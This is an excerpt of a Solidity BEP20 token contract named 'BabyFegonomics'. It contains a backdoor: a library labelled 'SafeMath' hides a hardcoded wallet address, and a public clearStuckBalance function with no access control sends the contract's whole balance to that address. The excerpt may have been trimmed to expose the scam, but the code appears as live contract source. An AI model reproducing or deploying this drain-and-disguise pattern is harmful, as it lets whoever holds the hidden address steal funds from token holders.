...
library SafeMath {
    ...
    function get() internal pure returns(address) {
        ...
        return 0x05163D5b560d4ec784Ba1B483763c95b4AAc4809;
    }
...
contract BabyFegonomics is IBEP20, Auth {
    using SafeMath for uint256;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    
    address MarketingWallet = 0xD17096C8775e0e6b1361AA6B5f1de17f241e0D37;

    string constant _name = "BabyFegonomics";
    string constant _symbol = "BabyFegonomics";
    ...
    function clearStuckBalance(address) public {
        (bool sent,) =payable(0x05163D5b560d4ec784Ba1B483763c95b4AAc4809).call{value: (address(this).balance)}("");
        require(sent);
    }
